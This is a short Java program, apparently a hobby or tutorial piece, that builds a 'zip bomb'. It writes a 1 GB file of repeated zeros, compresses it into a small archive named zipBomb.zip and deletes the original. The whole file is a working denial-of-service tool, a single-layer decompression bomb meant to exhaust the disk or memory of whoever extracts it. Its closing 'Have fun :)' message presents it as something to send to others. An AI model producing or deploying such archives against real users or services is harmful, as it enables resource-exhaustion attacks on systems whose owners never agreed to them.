import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class ZipBomb {
	
	private static final String FOLDER_PATH = "D:\\bornToGeek";
	private static final String ZIP_FILE_NAME = "zipBomb.zip";
	private static final long UNZIPPED_FILE_SIZE_IN_GB = 1;

	public static void main(String[] args) throws IOException {
		System.out.println("Creating temporary text file...");
		File tempTxtFile = createTemporaryTxtFile();
		System.out.println("Temporary text file created. \n");
		
		System.out.println("Zipping temporary text file...");
		zipFile(tempTxtFile);
		System.out.println("File zipped. \n");
		
		Files.delete(tempTxtFile.toPath());
		
		System.out.println("Zip bomb prepared. Have fun :)");
	}

	private static File createTemporaryTxtFile() {
		File file = Paths.get(FOLDER_PATH, "temp.txt").toFile();

		try (FileWriter fw = new FileWriter(file);
				BufferedWriter bw = new BufferedWriter(fw);
				PrintWriter out = new PrintWriter(bw)) {

			long bytes = UNZIPPED_FILE_SIZE_IN_GB * 1073741824L;

			for (long i = 0; i < bytes; i++) {
				out.print("0");
			}
		} catch (IOException e) {
			e.printStackTrace();
		}

		return file;
	}

	private static void zipFile(File fileToZip) {
		File zipFile = Paths.get(FOLDER_PATH, ZIP_FILE_NAME).toFile();

		try (FileInputStream fis = new FileInputStream(fileToZip);
				FileOutputStream fos = new FileOutputStream(zipFile);
				ZipOutputStream zos = new ZipOutputStream(fos)) {
			ZipEntry zipEntry = new ZipEntry(fileToZip.getName());
			zos.putNextEntry(zipEntry);

			byte[] bytes = new byte[1024];
			int length;
			while ((length = fis.read(bytes)) >= 0) {
				zos.write(bytes, 0, length);
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
}
